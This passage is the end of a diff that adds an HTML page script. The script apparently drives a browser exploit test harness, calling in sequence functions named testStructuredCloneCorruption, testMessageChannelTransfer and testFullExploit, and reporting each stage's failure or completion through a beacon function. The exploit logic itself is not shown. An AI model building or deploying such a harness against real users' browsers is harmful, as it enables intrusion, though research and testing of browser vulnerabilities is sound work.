+      try{testStructuredCloneCorruption()}catch(e){log('C FATAL: '+e.message,'err');beacon('C-FATAL',e.message.substring(0,60))}
+      setTimeout(function(){
+        try{testMessageChannelTransfer()}catch(e){log('D FATAL: '+e.message,'err');beacon('D-FATAL',e.message.substring(0,60))}
+        setTimeout(function(){
+          try{testFullExploit()}catch(e){log('E FATAL: '+e.message,'err');beacon('E-FATAL',e.message.substring(0,60))}
+          beacon('DONE');
+        },500);
+      },500);
+    },500);
+  },500);
+},200);
+</script>
+</body>
+</html>
